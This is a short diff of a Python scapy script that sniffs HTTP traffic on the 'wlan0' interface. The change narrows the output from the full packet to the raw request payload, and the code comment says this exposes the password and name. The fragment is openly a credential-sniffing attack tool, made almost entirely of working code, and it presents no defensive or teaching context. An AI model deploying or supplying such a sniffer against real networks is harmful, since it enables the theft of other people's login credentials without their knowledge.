@@ -7,5 +7,5 @@ def sniff_packet(interfaces):
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):#it will print every information printed through http
         if packet.haslayer(http.Raw):
-            print(packet.show())
+            print(packet[scapy.Raw].load)#it will only show password asn name
 sniff_packet("wlan0")
